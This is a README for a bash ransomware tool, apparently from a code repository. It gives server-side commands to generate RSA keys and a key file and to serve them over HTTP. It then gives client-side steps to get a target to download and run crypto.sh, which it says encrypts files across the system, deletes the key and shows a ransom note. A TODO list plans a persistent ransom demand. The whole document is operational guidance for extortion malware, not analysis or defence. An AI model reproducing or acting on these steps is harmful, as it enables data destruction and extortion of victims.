# Bash Ransomware

## What to do on the server-side
 - $ openssl genrsa -out priv.pem 4096
 - $ openssl rsa -pubout -in priv.pem -out pub.pem
 - $ cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > key.bin
 - $ mkdir -p /var/www/html/downloads
 - $ cp pub.pem /var/www/html/downloads/
 - $ cp key.bin /var/www/html/downloads/
 - $ python SimplHTTPServer 8080

## What to do on the client-side
 - Get target to download the file and execute or if you have have access to the system, download it directly
 - $ chmod 755 crypto.sh
 - $ ./crypto.sh &

## What it does
 - Downloads the public key and key file to the target
 - Loops through the system and encrypts the various files
 - Deletes the key file and leaves the public key
 - Prints the ransome message

## TODO
 - Add in error handling for non-existing files
 - Imporve functionality and capabilities
 - Add persistent ransom demand
